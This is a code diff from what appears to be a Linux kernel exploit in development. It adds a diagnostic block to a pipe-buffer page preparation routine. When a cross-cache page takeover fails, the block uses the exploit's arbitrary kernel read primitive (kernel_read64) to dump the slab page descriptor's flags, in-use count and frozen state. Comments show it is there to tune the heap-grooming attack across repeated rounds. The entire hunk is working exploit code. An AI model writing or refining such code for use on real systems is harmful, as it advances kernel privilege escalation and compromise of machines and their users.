@@ -455,6 +455,20 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   }
   pr_info("pipe convert waves=%d taken=%d owned=%d sc=%016llx\n", waves_used,
           taken_wave, target_owned, (unsigned long long)tsc);
+  if (!target_owned && tsc != 0) {
+    /* app-domain diagnosis: the target page never left the slab across all
+     * waves (round8: sc identical for 24 waves x 8 rounds).  Read the slab
+     * page descriptor so the next forensics round can see who pins it
+     * (inuse>0 = live objects on the page; frozen = mid-rotation). */
+    uintptr_t head = direct_to_head_page(conv_fd, base);
+    uint64_t wflags = kernel_read64(conv_fd, head + 0);
+    uint64_t wmeta = kernel_read64(conv_fd, head + 0x28);
+    pr_info("phys wave stuck head=%016zx flags=%016llx meta=%016llx "
+            "inuse=%u objects=%u frozen=%d\n",
+            head, (unsigned long long)wflags, (unsigned long long)wmeta,
+            (unsigned)(wmeta & 0xffffu), (unsigned)((wmeta >> 16) & 0x7fffu),
+            (int)((wmeta >> 31) & 1u));
+  }
 
   shape_pipe_cache();
 
